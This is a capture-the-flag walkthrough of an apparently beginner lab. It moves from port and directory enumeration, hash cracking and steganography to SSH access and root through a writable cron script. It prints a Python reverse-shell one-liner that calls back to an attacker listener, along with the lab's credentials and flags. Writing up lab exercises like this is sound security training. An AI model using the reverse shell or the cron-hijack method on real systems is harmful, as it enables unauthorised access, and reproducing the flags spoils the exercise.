Deploy the machine attached to this task and use nmap to enumerate it.

nmap
```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-09 11:37 PST
Nmap scan report for 10.10.20.73
Host is up (0.16s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
6498/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))


```

gobuster with common.txt
```
└─$ gobuster dir -w common.txt -x php,html,txt -u http://10.10.20.73
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.20.73
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2021/12/09 11:39:17 Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.20.73/hidden/]
/index.html           (Status: 200) [Size: 612]                                 
/index.html           (Status: 200) [Size: 612]                                 
/robots.txt           (Status: 200) [Size: 43]                                  
/robots.txt           (Status: 200) [Size: 43]    
```

on /hidden -> binwalk and exiftool yield nothing from the page's background image.

gobuster on 10.10.20.73/hidden yielded a page /whatever. 
Hidden in its source code was `ZmxhZ3tmMXJzN19mbDRnfQ==` -> base64 decoded is `flag{f1rs7_fl4g}`

In the source of 10.10.20.73:65524, I found `its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu` -> its base62 encoded and it decodes to `/n0th1ng3ls3m4tt3r`
I also found `Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}`

on http://10.10.20.73:65524/n0th1ng3ls3m4tt3r/, I found `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81` hidden in the source code
```
─$ ./john --wordlist=/home/gomez22/Desktop/easypeasy.txt --format=gost ~/Desktop/hash                             
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?) 
```

hash-identifier tells me that flag3 is an md5 hash. Lets try to crack it.
9fdafbd64c47471a8f54cd3fc64cd312 -> candeger

on 10.10.20.73:65524/robots.txt
```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
a18672860d0510e5ab6699730763b250 -> md5 hash -> md5hashing.net -> flag{1m_s3c0nd_fl4g}

on http://10.10.20.73:65524/n0th1ng3ls3m4tt3r/ is a background image and a foreground image. I copied the foreground image and
used steghide to see if anything was hidden in the image. When prompted for a password, I used
`mypasswordforthatjob` and I successfully extracted a secrettext.txt file.

secrettext.txt
```
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 
01110010 01110100 01100101 01100100 01101101 01111001 
01110000 01100001 01110011 01110011 01110111 01101111 
01110010 01100100 01110100 01101111 01100010 01101001 
01101110 01100001 01110010 01111001

```

converting the binary gives us the credentials `boring:iconvertedmypasswordtobinary`.

Let's ssh in.
```
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

 synt{a0jvgf33zfa0ez4y}-> rot13 -> flag{n0wits33msn0rm4l}
 
 hmm, so I can't run sudo as this user.
 
 ```
 sudo --version
 boring@kral4-PC:/$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

 ```
 
 ```
 boring@kral4-PC:/etc$ cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

 ```
 boring@kral4-PC:/var/www$ ls -la
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh

 ```
 boring@kral4-PC:/var/www$ ls -la
total 16
drwxr-xr-x  3 root   root   4096 Jun 15  2020 .
drwxr-xr-x 14 root   root   4096 Jun 13  2020 ..
drwxr-xr-x  4 root   root   4096 Jun 15  2020 html
-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh

 ```
 `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.248.108",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
 
 ```
 └─$ netcat -nvlp 1111
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1111
Ncat: Listening on 0.0.0.0:1111
Ncat: Connection from 10.10.20.73.  
Ncat: Connection from 10.10.20.73:50350.
bash: cannot set terminal process group (1926): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# whoami
whoami
root
root@kral4-PC:/var/www# 
 ```
 
 ```
 root@kral4-PC:~# ls -a
ls -a
.
..
.bash_history
.bashrc
.cache                                                                                                             
.gnupg                                                                                                             
.local                                                                                                             
.profile                                                                                                           
.root.txt                                                                                                          
.selected_editor                                                                                                   
root@kral4-PC:~# cat .root.txt                                                                                     
cat .root.txt                                                                                                      
flag{63a9f0ea7bb98050796b649e85481845}  
 ```
